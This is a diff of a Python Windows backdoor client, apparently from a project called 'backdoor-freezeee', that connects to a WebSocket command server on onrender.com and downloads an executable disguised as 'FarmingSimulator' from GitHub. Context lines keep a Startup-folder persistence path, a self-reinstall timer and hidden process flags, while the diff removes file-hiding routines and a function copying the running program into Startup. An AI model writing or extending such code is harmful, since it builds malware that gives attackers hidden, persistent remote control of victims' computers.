@@ -8,33 +8,17 @@ import ctypes
 import shutil
 import threading
 
-FILE_ATTRIBUTE_HIDDEN = 0x2
 FILE_ATTRIBUTE_SYSTEM = 0x4
 
 CREATE_NO_WINDOW = 0x08000000
 SERVER_URL = "wss://backdoor-freezeee.onrender.com"
 CLIENT_NAME = getpass.getuser()
-FILE_ATTRIBUTE_NORMAL = 0x80
 
 current_exe = sys.executable
 startup_folder = os.path.join("C:\\Users", CLIENT_NAME, "AppData", "Roaming",
                             "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-exe_final_location = os.path.join(startup_folder, "FarmingSimulatorRI.exe")
+exe_final_location = os.path.join(startup_folder, "FarmingSimulator.exe")
 url = "https://raw.githubusercontent.com/sincezola/backdoor-freezeee/main/src/bin/FarmingSimulatorRI.exe"
-
-def unhide_file(path: str):
-    res = ctypes.windll.kernel32.SetFileAttributesW(
-        path,
-        FILE_ATTRIBUTE_NORMAL
-    )
-    if not res:
-        raise ctypes.WinError()
-    
-def hide_file(path):
-    ctypes.windll.kernel32.SetFileAttributesW(
-        path,
-        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
-    )
 
 def reinstall_program():
     if not os.path.isfile(exe_final_location):
@@ -54,22 +38,6 @@ def reinstall_program():
 
 def check_reinstall():
     threading.Timer(5.0, reinstall_program).start()
-
-def move_to_startup():
-    for f in os.listdir(startup_folder):
-        if f.startswith("farmingsimulatorri") or f.startswith("farmingsimulator") and f.endswith(".exe"):
-            return
-
-    dest_name = f"farmingsimulator.exe"
-    dest = os.path.join(startup_folder, dest_name)
-
-    try:
-        shutil.copy(current_exe, dest)
-        print(f"Copied to Startup as {dest_name}.")
-        unhide_file(dest)
-    except Exception as e:
-        print("Error copying to Startup:", e)
-
 
 def get_block_inputs_path():
     if hasattr(sys, "_MEIPASS"):
@@ -99,8 +67,6 @@ startupinfo.wShowWindow = subprocess.SW_HIDE
 
 creationflags = subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
 
-hide_file(current_exe)
-move_to_startup()
 check_reinstall()
 
 async def receiver(ws):
@@ -180,7 +146,6 @@ async def main():
                 ws = None
 
             else:
-                # already have an open connection, wait a bit before re-checking
                 await asyncio.sleep(1)
 
         except Exception as e:
